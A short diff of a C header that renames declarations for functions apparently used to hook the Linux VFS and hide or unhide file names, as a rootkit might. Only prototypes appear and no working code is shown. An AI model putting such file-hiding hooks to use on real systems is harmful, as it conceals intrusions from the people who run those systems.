@@ -8,8 +8,8 @@ struct __dir_context {
 };
 
 void vfs_debug(void);
-void hook_vfs(void);
-int hide_filename(const char *name, unsigned int len);
-int unhide_filename(const char *name, unsigned int len);
+void vfs_hook(void);
+int vfs_hide_filename(const char *name, unsigned int len);
+int vfs_unhide_filename(const char *name, unsigned int len);
 
 #endif
